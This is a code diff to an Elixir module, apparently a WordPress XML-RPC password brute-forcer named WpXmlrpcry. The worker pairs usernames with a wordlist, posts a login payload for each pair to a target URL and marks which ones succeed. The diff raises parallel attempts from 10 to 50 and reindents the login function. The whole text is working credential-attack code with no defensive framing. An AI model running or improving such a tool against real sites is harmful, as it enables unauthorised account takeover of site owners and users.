@@ -9,9 +9,10 @@ defmodule WpXmlrpcry.Worker do
     result =
       Util.combine_user_pass(users, wordlist)
       |> Task.async_stream(&do_login(&1, url),
-      max_concurrency: 10,
-      timeout: :infinity,
-      ordered: false)
+        max_concurrency: 50,
+        timeout: :infinity,
+        ordered: false
+      )
       |> Stream.map(fn {_status, response} -> response end)
       |> Enum.to_list()
       |> Report.format_result(url)
@@ -20,15 +21,15 @@ defmodule WpXmlrpcry.Worker do
   end
 
   def do_login(%{username: user, password: pass}, url) do
-      with payload <- generate_payload(username: user, password: pass),
-           {:ok, response} <- Http.post(url, payload),
-           parsed_body <- Http.extract_body(response),
-           true <- Http.text_in_body?(parsed_body, @pattern) do
-        %{username: user, password: pass, success: true}
-      else
-        _ ->
-          %{username: user, password: pass, success: false}
-      end
+    with payload <- generate_payload(username: user, password: pass),
+         {:ok, response} <- Http.post(url, payload),
+         parsed_body <- Http.extract_body(response),
+         true <- Http.text_in_body?(parsed_body, @pattern) do
+      %{username: user, password: pass, success: true}
+    else
+      _ ->
+        %{username: user, password: pass, success: false}
+    end
   end
 
   def generate_payload(username: u, password: p) do
